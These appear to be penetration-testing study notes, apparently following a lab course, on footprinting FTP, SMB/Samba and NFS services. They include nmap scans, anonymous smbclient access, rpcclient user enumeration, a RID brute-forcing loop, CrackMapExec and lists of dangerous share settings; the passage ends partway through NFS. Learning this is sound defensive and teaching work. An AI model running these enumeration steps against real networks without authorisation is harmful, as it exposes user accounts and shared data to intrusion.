    As we already know, the FTP server usually runs on the standard `TCP` `port 21`, which we can scan using Nmap. We also use the version scan (`-sV`), aggressive scan (`-A)`, and the default script scan (`-sC`) against our target 10.179.114.136.
    
        sudo nmap -sV -p21 -sC -A 10.129.14.136

3.  Nmap Script Trace

        sudo nmap -sV -p21 -sC -A 10.179.114.136 --script-trace

4.  Service Interaction

    If necessary, we can, of course, use other applications such as `netcat` or `telnet` to interact with the FTP server.
    
        nc -nv 10.129.14.136 21
    
        telnet 10.129.14.136 21
    
    It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL. For this, we can use the client openssl and communicate with the FTP server. The good thing about using `openssl` is that we can see the SSL certificate, which can also be helpful.
    
        openssl s_client -connect 10.129.14.136:21 -starttls ftp
        
        CONNECTED(00000003)                                                                                      
        Can't use SSL_get_servername                        
        depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
        verify error:num=18:self signed certificate
        verify return:1
        
        depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
        verify return:1
        ---                                                 
        Certificate chain
         0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
        
         i:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
        ---
        
        Server certificate
        
        -----BEGIN CERTIFICATE-----
        
        MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL
        ...SNIP...	
    
    This is because the SSL certificate allows us to recognize the `hostname`, for example, and in most cases also an `email address` for the organization or company.


<a id="orgbe7ea7f"></a>

## SMB\\445

Server Message Block (`SMB`) is a client-server protocol governing access to files, directories, and network resources like printers. Initially part of OS/2's LAN Manager, it's chiefly used within the Windows OS, allowing newer systems to communicate with older ones. Samba, a free software project, extends SMB to Linux and Unix, enabling cross-platform communication. 

SMB facilitates communication between clients and network participants to access shared files or services. Both parties must implement the protocol, exchange messages, and establish a `TCP-based` connection through a `three-way handshake`. An SMB server can offer parts of its file system as shares, with access rights defined by Access Control Lists (`ACL`). These ACLs grant specific permissions to users or user groups, independent of local server rights.


<a id="orgc072d18"></a>

### Samba

Samba bridges Unix and Windows via `Common Internet File System` (`CIFS`), an `SMB` "dialect." SMB versions differ in Windows support and features. Samba's v3 supports Active Directory, v4 serves as a domain controller. Hosts in a workgroup connect via NetBIOS/WINS for naming and data sharing.
However, CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports 137, 138, 139, but CIFS uses TCP port 445 only. There are several versions of SMB, including outdated versions that are still used in specific infrastructures.

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">SMB Version</th>
<th scope="col" class="org-left">Supported</th>
<th scope="col" class="org-left">Features</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">CIFS</td>
<td class="org-left">Windows NT 4.0</td>
<td class="org-left">Communicates through NetBIOS interface</td>
</tr>


<tr>
<td class="org-left">SMB 1.0</td>
<td class="org-left">Windows 2000</td>
<td class="org-left">Direct TCP connection</td>
</tr>


<tr>
<td class="org-left">SMB 2.0</td>
<td class="org-left">Windows Vista, Windows Server 2008</td>
<td class="org-left">Enhanced performance, improved message signing, caching feature</td>
</tr>


<tr>
<td class="org-left">SMB 2.1</td>
<td class="org-left">Windows 7, Windows Server 2008 R2</td>
<td class="org-left">Locking mechanisms</td>
</tr>


<tr>
<td class="org-left">SMB 3.0</td>
<td class="org-left">Windows 8, Windows Server 2012</td>
<td class="org-left">Multichannel connections, end-to-end encryption, remote storage access</td>
</tr>


<tr>
<td class="org-left">SMB 3.0.2</td>
<td class="org-left">Windows 8.1, Windows Server 2012 R2</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">SMB 3.1.1</td>
<td class="org-left">Windows 10, Windows Server 2016</td>
<td class="org-left">Integrity checking, AES-128 encryption</td>
</tr>
</tbody>
</table>

Presently, Samba's version 3 empowers full Active Directory membership, while version 4 operates as an Active Directory domain controller. In the network environment, hosts in a workgroup collaborate, facilitated by the NetBIOS/WINS for naming and data exchange purposes.
With version 4, Samba even provides an Active Directory domain controller. It contains several so-called daemons for this purpose - which are Unix background programs. The SMB server daemon (`smbd`) belonging to Samba provides the first two functionalities, while the NetBIOS message block daemon (`nmbd`) implements the last two functionalities. The SMB service controls these two background programs.

We know that Samba is suitable for both Linux and Windows systems. In a network, each host participates in the same workgroup. A `workgroup` is a group name that identifies an arbitrary collection of computers and their resources on an SMB network. There can be multiple workgroups on the network at any given time. IBM developed an application `programming interface` (`API`) for networking computers called the `Network Basic Input/Output System` (`NetBIOS`).

1.  Default Configuration

    As we can imagine, Samba offers a wide range of settings that we can configure. Again, we define the settings via a text file where we can get an overview of some of the settings.
    
        cat /etc/samba/smb.conf | grep -v "#\|\;"
        [global]
           workgroup = DEV.INFREIGHT.LOCAL
           server string = DEVSMB
           log file = /var/log/samba/log.%m
           max log size = 1000
           logging = file
           panic action = /usr/share/samba/panic-action %d
        
           server role = standalone server
           obey pam restrictions = yes
           unix password sync = yes
        
           passwd program = /usr/bin/passwd %u
           passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
        
           pam password change = yes
           map to guest = bad user
           usershare allow guests = yes
        
        [printers]
           comment = All Printers
           browseable = no
           path = /var/spool/samba
           printable = yes
           guest ok = no
           read only = yes
           create mask = 0700
        
        [print$]
           comment = Printer Drivers
           path = /var/lib/samba/printers
           browseable = yes
           read only = yes
           guest ok = no
    
    We see global settings and two shares that are intended for printers. The global settings are the configuration of the available SMB server that is used for all shares.
    
    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Setting</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">[sharename]</td>
    <td class="org-left">The name of the network share.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">workgroup = WORKGROUP/DOMAIN</td>
    <td class="org-left">Workgroup that will appear when clients query.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">path = <i>path/here</i></td>
    <td class="org-left">The directory to which the user is to be given access.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">server string = STRING</td>
    <td class="org-left">The string that will show up when a connection is initiated.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">unix password sync = yes</td>
    <td class="org-left">Synchronize the UNIX password with the SMB password?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">usershare allow guests = yes</td>
    <td class="org-left">Allow non-authenticated users to access the defined share?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">map to guest = bad user</td>
    <td class="org-left">What to do when a user login request doesn't match a valid UNIX user?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">browseable = yes</td>
    <td class="org-left">Should this share be shown in the list of available shares?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">guest ok = yes</td>
    <td class="org-left">Allow connecting to the service without using a password?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">read only = yes</td>
    <td class="org-left">Allow users to read files only?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">create mask = 0700</td>
    <td class="org-left">What permissions need to be set for newly created files?</td>
    </tr>
    </tbody>
    </table>

2.  Dangerous Settings

    The settings outlined in the configuration hold sensitivity. For instance, enabling '`browseable = yes`' offers convenience to employees, allowing easy access and navigation through shared folders for organizational purposes. However, this convenience extends to potential attackers who, upon gaining access, can exploit this setting to explore sensitive contents, posing a security risk to the company's data. This dual nature of settings highlights the trade-off between user convenience and `potential vulnerabilities`.
    
    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Setting</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">browseable = yes</td>
    <td class="org-left">Allow listing available shares in the current share?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">read only = no</td>
    <td class="org-left">Forbid the creation and modification of files?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">writable = yes</td>
    <td class="org-left">Allow users to create and modify files?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">guest ok = yes</td>
    <td class="org-left">Allow connecting to the service without using a password?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">enable privileges = yes</td>
    <td class="org-left">Honor privileges assigned to specific SID?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">create mask = 0777</td>
    <td class="org-left">What permissions must be assigned to the newly created files?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">directory mask = 0777</td>
    <td class="org-left">What permissions must be assigned to the newly created directories?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">logon script = script.sh</td>
    <td class="org-left">Script to be executed on the user's login?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">magic script = script.sh</td>
    <td class="org-left">Script to be executed when the session is closed?</td>
    </tr>
    
    
    <tr>
    <td class="org-left">magic output = script.out</td>
    <td class="org-left">Location to store the output of the magic script?</td>
    </tr>
    </tbody>
    </table>

3.  Example Share

    In creating a share like `[notes]` and others, applying the settings as listed can significantly impact the enumeration process. Settings, commonly employed for testing purposes, might persist within internal subnets or small team environments in larger departments, inadvertently granting broad access. Failure to reset these settings leads to unintended consequences, allowing easy browsing, inspection, and potential download of shared data, posing a significant security risk.
    
        ...SNIP...
        
        [notes]
                comment = CheckIT
                path = /mnt/notes/
        
                browseable = yes
                read only = no
                writable = yes
                guest ok = yes
        
                enable privileges = yes
                create mask = 0777
                directory mask = 0777
    
    It is highly recommended to look at the man pages for Samba and configure it ourselves and experiment with the settings. We will then discover potential aspects that will be interesting for us as a penetration tester. In addition, the more familiar we become with the Samba server and SMB, the easier it will be to find our way around the environment and use it for our purposes. Once we have adjusted `/etc/samba/smb.conf` to our needs, we have to restart the service on the server.

4.  Restart Samba

        sudo systemctl restart smbd

5.  SMBclient - Connecting to the Share

        smbclient -N -L //10.129.14.128
        
                Sharename       Type      Comment
                ---------       ----      -------
                print$          Disk      Printer Drivers
                home            Disk      INFREIGHT Samba
                dev             Disk      DEVenv
                notes           Disk      CheckIT
                IPC$            IPC       IPC Service (DEVSM)
              SMB1 disabled -- no workgroup available
    
    The Samba server now hosts five distinct shares, including the default '`print$`' and '`IPC$`' shares, established in the basic configuration. Focusing on the '`[notes]`' share, accessing and inspecting it through the client program allows for a closer examination. For those unfamiliar with the client program, leveraging the '`help`' command post-login reveals a comprehensive list of available commands, aiding navigation and execution within the share.
    
        smbclient //10.129.14.128/notes
        
        Enter WORKGROUP\<username>'s password: 
        Anonymous login successful
        Try "help" to get a list of possible commands.
        
        
        smb: \> help
        
        ?              allinfo        altname        archive        backup         
        blocksize      cancel         case_sensitive cd             chmod          
        chown          close          del            deltree        dir            
        du             echo           exit           get            getfacl        
        geteas         hardlink       help           history        iosize         
        lcd            link           lock           lowercase      ls             
        l              mask           md             mget           mkdir          
        more           mput           newer          notify         open           
        posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
        posix_unlink   posix_whoami   print          prompt         put            
        pwd            q              queue          quit           readlink       
        rd             recurse        reget          rename         reput          
        rm             rmdir          showacls       setea          setmode        
        scopy          stat           symlink        tar            tarmode        
        timeout        translate      unlock         volume         vuid           
        wdel           logon          listconnect    showconnect    tcon           
        tdis           tid            utimes         logoff         ..             
        !            
        
        
        smb: \> ls
        
          .                                   D        0  Wed Sep 22 18:17:51 2021
          ..                                  D        0  Wed Sep 22 12:03:59 2021
          prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021
        
                        30313412 blocks of size 1024. 16480084 blocks available	

6.  Download Files from SMB

    Once we have discovered interesting files or folders, we can download them using the `get` command. Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (`!<cmd>`) without interrupting the connection.
    
        smb: \> get prep-prod.txt 
        
        getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) 
        (average 8,7 KiloBytes/sec)
        
        
        smb: \> !ls
        
        prep-prod.txt
        
        
        smb: \> !cat prep-prod.txt
        
        [] check your code with the templates
        [] run code-assessment.py
        [] …	

7.  Samba Status

    From an administrative perspective, '`smbstatus`' offers insights into active connections within the Samba server, displaying details such as connected clients, their originating hosts, and the accessed shares. This information becomes crucial, especially when navigating subnets or isolated networks accessible to others.
    
    In domain-level security, the Samba server operates as part of a Windows domain, which typically includes at least one domain controller responsible for password authentication. The domain controller ensures secure authentication within the workgroup, managing user credentials in its `Security Authentication Module` (`SAM`). Upon user login and share access requests, these domain controllers authenticate users, enhancing security within the network.
    
        Samba version 4.11.6-Ubuntu
        PID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              
        ----------------------------------------------------------------------------------------------------------------------------------------
        75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    
        
        Service      pid     Machine       Connected at                     Encryption   Signing     
        ---------------------------------------------------------------------------------------------
        notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           
        
        No locked files


<a id="orgf7893e4"></a>

### Footprinting the Service

1.  Nmap

        sudo nmap 10.129.14.128 -sV -sC -p139,445
        
        Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
        Nmap scan report for sharing.inlanefreight.htb (10.129.14.128)
        Host is up (0.00024s latency).
        
        PORT    STATE SERVICE     VERSION
        139/tcp open  netbios-ssn Samba smbd 4.6.2
        445/tcp open  netbios-ssn Samba smbd 4.6.2
        MAC Address: 00:00:00:00:00:00 (VMware)
        
        Host script results:
        |_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
        | smb2-security-mode: 
        |   2.02: 
        |_    Message signing enabled but not required
        | smb2-time: 
        |   date: 2021-09-19T13:16:04
        |_  start_date: N/A
        
        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds

2.  RPCclient

    We can see from the results that it is not very much that Nmap provided us with here. Therefore, we should resort to other tools that allow us to interact manually with the SMB and send specific requests for the information. One of the handy tools for this is `rpcclient`. This is a tool to perform MS-RPC functions.
    
    The [Remote Procedure Call](https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/) (`RPC`) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value.
    
        rpcclient -U "" 10.129.14.128
        
        Enter WORKGROUP\'s password:
        rpcclient $> 
    
    The `rpcclient` offers us many different requests with which we can execute specific functions on the SMB server to get information. A complete list of all these functions can be found on the man page of the rpcclient.
    
    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Query</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">srvinfo</td>
    <td class="org-left">Server information.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">enumdomains</td>
    <td class="org-left">Enumerate all domains deployed in the network.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">querydominfo</td>
    <td class="org-left">Provides domain, server, and user information of deployed domains.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">netshareenumall</td>
    <td class="org-left">Enumerates all available shares.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">netsharegetinfo &lt;share&gt;</td>
    <td class="org-left">Provides information about a specific share.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">enumdomusers</td>
    <td class="org-left">Enumerates all domain users.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">queryuser &lt;RID&gt;</td>
    <td class="org-left">Provides information about a specific user.</td>
    </tr>
    </tbody>
    </table>

3.  RPCclient - Enumeration

        rpcclient $> srvinfo
        
                DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
                platform_id     :       500
                os version      :       6.1
                server type     :       0x809a03
        
        
        rpcclient $> enumdomains
        
        name:[DEVSMB] idx:[0x0]
        name:[Builtin] idx:[0x1]
        
        
        rpcclient $> querydominfo
        
        Domain:         DEVOPS
        Server:         DEVSMB
        Comment:        DEVSM
        Total Users:    2
        Total Groups:   0
        Total Aliases:  0
        Sequence No:    1632361158
        Force Logoff:   -1
        Domain Server State:    0x1
        Server Role:    ROLE_DOMAIN_PDC
        Unknown 3:      0x1
        
        
        rpcclient $> netshareenumall
        
        netname: print$
                remark: Printer Drivers
                path:   C:\var\lib\samba\printers
                password:
        netname: home
                remark: INFREIGHT Samba
                path:   C:\home\
                password:
        netname: dev
                remark: DEVenv
                path:   C:\home\sambauser\dev\
                password:
        netname: notes
                remark: CheckIT
                path:   C:\mnt\notes\
                password:
        netname: IPC$
                remark: IPC Service (DEVSM)
                path:   C:\tmp
                password:
        
        
        rpcclient $> netsharegetinfo notes
        
        netname: notes
                remark: CheckIT
                path:   C:\mnt\notes\
                password:
                type:   0x0
                perms:  0
                max_uses:       -1
                num_uses:       1
        revision: 1
        type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
        DACL
                ACL     Num ACEs:       1       revision:       2
                ---
                ACE
                        type: ACCESS ALLOWED (0) flags: 0x00 
                        Specific bits: 0x1ff
                        Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                        SID: S-1-1-0
    
    The examples provided highlight the potential information leakage to `anonymous users` within a network. Granting access to network services to anonymous users can inadvertently expose critical information or grant excessive permissions, posing a significant risk to the entire network's security.
    
    Anonymous access not only jeopardizes the network but also facilitates the discovery of other users, potentially leading to aggressive brute-force attacks. Human error, coupled with inadequate security awareness and lax password practices, often results in weak passwords vulnerable to easy cracking.

4.  Rpcclient - User Enumeration

    To illustrate user enumeration, the 'rpcclient' tool can be employed, showcasing how attackers could exploit vulnerabilities to enumerate users within the network.
    
        rpcclient $> enumdomusers
        
        user:[mrb3n] rid:[0x3e8]
        user:[cry0l1t3] rid:[0x3e9]
        
        
        rpcclient $> queryuser 0x3e9
        
                User Name   :   cry0l1t3
                Full Name   :   cry0l1t3
                Home Drive  :   \\devsmb\cry0l1t3
                Dir Drive   :
                Profile Path:   \\devsmb\cry0l1t3\profile
                Logon Script:
                Description :
                Workstations:
                Comment     :
                Remote Dial :
                Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
                Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
                Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
                Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
                Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
                Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
                unknown_2[0..31]...
                user_rid :      0x3e9
                group_rid:      0x201
                acb_info :      0x00000014
                fields_present: 0x00ffffff
                logon_divs:     168
                bad_password_count:     0x00000000
                logon_count:    0x00000000
                padding1[0..7]...
                logon_hrs[0..21]...
        
        
        rpcclient $> queryuser 0x3e8
        
                User Name   :   mrb3n
                Full Name   :
                Home Drive  :   \\devsmb\mrb3n
                Dir Drive   :
                Profile Path:   \\devsmb\mrb3n\profile
                Logon Script:
                Description :
                Workstations:
                Comment     :
                Remote Dial :
                Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
                Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
                Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
                Password last set Time   :      Mi, 22 Sep 2021 17:47:59 CEST
                Password can change Time :      Mi, 22 Sep 2021 17:47:59 CEST
                Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
                unknown_2[0..31]...
                user_rid :      0x3e8
                group_rid:      0x201
                acb_info :      0x00000010
                fields_present: 0x00ffffff
                logon_divs:     168
                bad_password_count:     0x00000000
                logon_count:    0x00000000
                padding1[0..7]...
                logon_hrs[0..21]...

5.  Rpcclient - Group Information

    We can then use the results to identify the group's RID, which we can then use to retrieve information from the entire group.
    
        rpcclient $> querygroup 0x201
        
                Group Name:     None
                Description:    Ordinary Users
                Group Attribute:7
                Num Members:2

6.  Brute Forcing User RIDs

        for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
        
                User Name   :   sambauser
                user_rid :      0x1f5
                group_rid:      0x201
        
                User Name   :   mrb3n
                user_rid :      0x3e8
                group_rid:      0x201
        
                User Name   :   cry0l1t3
                user_rid :      0x3e9
                group_rid:      0x201

7.  Impacket - Samrdump.py

    An alternative to this would be a Python script from [Impacket](https://github.com/SecureAuthCorp/impacket) called [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py).
    
        samrdump.py 10.129.14.128
        
        Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
        
        [*] Retrieving endpoint list from 10.129.14.128
        Found domain(s):
         . DEVSMB
         . Builtin
        [*] Looking up users in domain DEVSMB
        Found user: mrb3n, uid = 1000
        Found user: cry0l1t3, uid = 1001
        mrb3n (1000)/FullName: 
        mrb3n (1000)/UserComment: 
        mrb3n (1000)/PrimaryGroupId: 513
        mrb3n (1000)/BadPasswordCount: 0
        mrb3n (1000)/LogonCount: 0
        mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
        mrb3n (1000)/PasswordDoesNotExpire: False
        mrb3n (1000)/AccountIsDisabled: False
        mrb3n (1000)/ScriptPath: 
        cry0l1t3 (1001)/FullName: cry0l1t3
        cry0l1t3 (1001)/UserComment: 
        cry0l1t3 (1001)/PrimaryGroupId: 513
        cry0l1t3 (1001)/BadPasswordCount: 0
        cry0l1t3 (1001)/LogonCount: 0
        cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
        cry0l1t3 (1001)/PasswordDoesNotExpire: False
        cry0l1t3 (1001)/AccountIsDisabled: False
        cry0l1t3 (1001)/ScriptPath: 
        [*] Received 2 entries.
    
    The information we have already obtained with `rpcclient` can also be obtained using other tools. For example, the [SMBMap](https://github.com/ShawnDEvans/smbmap) and [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) tools are also widely used and helpful for the enumeration of SMB services.

8.  SMBmap

        smbmap -H 10.129.14.128
        
        [+] Finding open SMB ports....
        [+] User SMB session established on 10.129.14.128...
        [+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
                Disk                                                    Permissions     Comment
                ----                                                    -----------     -------
                print$                                                  NO ACCESS       Printer Drivers
                home                                                    NO ACCESS       INFREIGHT Samba
                dev                                                     NO ACCESS       DEVenv
                notes                                                   NO ACCESS       CheckIT
                IPC$                                                    NO ACCESS       IPC Service (DEVSM)

9.  CrackMapExec

        crackmapexec smb 10.129.14.128 --shares -u '' -p ''
        
        SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
        SMB         10.129.14.128   445    DEVSMB           [+] \: 
        SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
        SMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark
        SMB         10.129.14.128   445    DEVSMB           -----           -----------     ------
        SMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers
        SMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba
        SMB         10.129.14.128   445    DEVSMB           dev                             DEVenv
        SMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT
        SMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)

10. enum4linux

    Another tool worth mentioning is the so-called [enum4linux-ng](https://github.com/cddmp/enum4linux-ng), which is based on an older tool, enum4linux. This tool automates many of the queries, but not all, and can return a large amount of information.
    
    1.  Install
    
            git clone https://github.com/cddmp/enum4linux-ng.git
            cd enum4linux-ng
            pip3 install -r requirements.txt
    
    2.  Enumeration
    
            ./enum4linux-ng.py 10.179.114.128 -A


<a id="org20365b4"></a>

## NFS\\111,2049

`Network File System` (`NFS`) is a network file system developed by Sun Microsystems and has the same purpose as **SMB**. Its purpose is to access file systems over a network as if they were local. 
NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers.

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Version</th>
<th scope="col" class="org-left">Features</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">NFSv2</td>
<td class="org-left">Older version widely supported by many systems; originally operated solely over UDP.</td>
</tr>


<tr>
<td class="org-left">NFSv3</td>
<td class="org-left">Offers additional features like variable file size, improved error reporting, but lacks full compatibility with NFSv2 clients.</td>
</tr>


<tr>
<td class="org-left">NFSv4</td>
<td class="org-left">Introduces Kerberos authentication, functions efficiently across firewalls and the internet, eliminates portmappers, supports ACLs, applies state-based operations, enhances performance, and prioritizes high security. First version with a stateful protocol.</td>
</tr>
</tbody>
</table>

A significant advantage of `NFSv4` over its predecessors is that only one UDP or TCP port `2049` is used to run the service, which simplifies the use of the protocol <span class="underline">across firewalls</span>.
NFS is based on the Open Network Computing Remote Procedure Call (`ONC-RPC` / `SUN-RPC`) protocol exposed on `TCP` and `UDP` ports `111`, which uses External Data Representation (`XDR`) for the system-independent exchange of data. The NFS protocol has no mechanism for `authentication` or `authorization`.
The most common authentication is via UNIX  `UID` / `GID` and `group memberships`, which is why this syntax is most likely to be applied to the NFS protocol.


<a id="orge496385"></a>

### Default Configuration

The configuration are provided into `/etc/exports`, the file is like:

    # /etc/exports: the access control list for filesystems which may be exported
    #               to NFS clients.  See exports(5).
    #
    # Example for NFSv2 and NFSv3:
    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
    #
    # Example for NFSv4:
    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)

Some possible `configuration`:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Option</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">rw</td>
<td class="org-left">Read and write permissions.</td>
</tr>


<tr>
<td class="org-left">ro</td>
<td class="org-left">Read-only permissions.</td>
</tr>


<tr>
<td class="org-left">sync</td>
<td class="org-left">Synchronous data transfer, albeit slightly slower.</td>
</tr>


<tr>
<td class="org-left">async</td>
<td class="org-left">Asynchronous data transfer, offering slightly faster speeds.</td>
</tr>


<tr>
<td class="org-left">secure</td>
<td class="org-left">Restricts the use of ports above 1024.</td>
</tr>


<tr>
<td class="org-left">insecure</td>
<td class="org-left">Allows the use of ports above 1024.</td>
</tr>


<tr>
<td class="org-left">no<sub>subtree</sub><sub>check</sub></td>
<td class="org-left">Disables the checking of subdirectory trees, potentially enhancing performance.</td>
</tr>


<tr>
<td class="org-left">root<sub>squash</sub></td>
<td class="org-left">Maps all permissions from root UID/GID 0 to the UID/GID of anonymous, securing root access on NFS mounts.</td>
</tr>
</tbody>
</table>

1.  ExportFS

        echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
        systemctl restart nfs-kernel-server
        exportfs
    
    We have shared the folder `/mnt/nfs` to the subnet `10.129.14.0/24` with the setting shown above

2.  Dangerous Settings

    Here are some of them listed:
    
    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-left" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left">Option</th>
    <th scope="col" class="org-left">Description</th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">rw</td>
    <td class="org-left">Grants both read and write permissions.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">insecure</td>
    <td class="org-left">Permits the utilization of ports above 1024 for NFS operations.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">nohide</td>
    <td class="org-left">Ensures that if another filesystem is mounted below an exported directory, it gets its own exports entry.</td>
    </tr>
    
    
    <tr>
    <td class="org-left">no<sub>root</sub><sub>squash</sub></td>
    <td class="org-left">Retains files created by root with the UID/GID 0, bypassing the usual mapping to anonymous UID/GID for security.</td>
    </tr>
    </tbody>
    </table>
    
    We can take a look at the insecure option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.


<a id="org02a5310"></a>

### Footprinting the Service

1.  Nmap

        sudo nmap 10.129.14.128 -p111,2049 -sV -sC
    
    The `rpcinfo` NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use.
    
        sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

2.  Show Available NFS Shares

        showmount -e 10.129.14.128

3.  Mounting NFS Share

        mkdir target-NFS
